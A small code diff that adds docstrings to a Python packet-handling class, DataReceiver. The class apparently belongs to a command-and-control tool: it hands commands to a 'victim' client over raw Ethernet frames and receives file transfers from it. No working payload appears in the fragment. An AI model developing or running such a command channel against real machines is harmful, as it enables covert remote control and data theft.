@@ -29,6 +29,12 @@ class DataReceiver():
             self._receive_recpt(pkt)
 
     def _receive_ping(self, pkt):
+        """Handle when the client sends a request to ping the server for a command to run
+        
+        Arguments:
+            pkt {Ether} -- packet sent from the client
+        """
+
         # Fetch given command that should be sent to the client
         print('ping')
         victim_mac = Mac(pkt.getlayer(Ether).src)
@@ -50,6 +56,12 @@ class DataReceiver():
         
 
     def _receive_data(self, pkt):
+        """Handle processing data corresponding to file transfers
+        
+        Arguments:
+            pkt {Ether} -- packet that was sent by the client
+        """
+
         print('receive_data')
         victim_mac = Mac(pkt.getlayer(Ether).src)
 
